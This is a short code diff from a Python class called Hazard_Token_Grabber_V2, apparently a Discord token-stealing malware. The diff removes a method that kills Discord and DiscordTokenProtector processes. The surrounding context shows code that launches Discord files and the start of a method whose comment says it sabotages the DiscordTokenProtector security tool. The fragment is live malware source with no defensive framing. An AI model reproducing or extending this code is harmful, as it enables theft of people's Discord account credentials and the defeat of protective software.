@@ -93,15 +93,6 @@ class Hazard_Token_Grabber_V2:
                 discord_file = os.path.join(root, name)
                 os.startfile(discord_file)
 
-    def killDiscord(self):
-        for proc in psutil.process_iter():
-            if any(procstr in proc.name().lower() for procstr in\
-            ['discord', 'discordtokenprotector', 'discordcanary', 'discorddevelopment', 'discordptb']):
-                try:
-                    proc.kill()
-                except psutil.NoSuchProcess:
-                    pass
-
     def bypassTokenProtector(self):
         #fucks up the discord token protector by https://github.com/andro2157/DiscordTokenProtector
         tp = f"{self.roaming}\\DiscordTokenProtector\\"
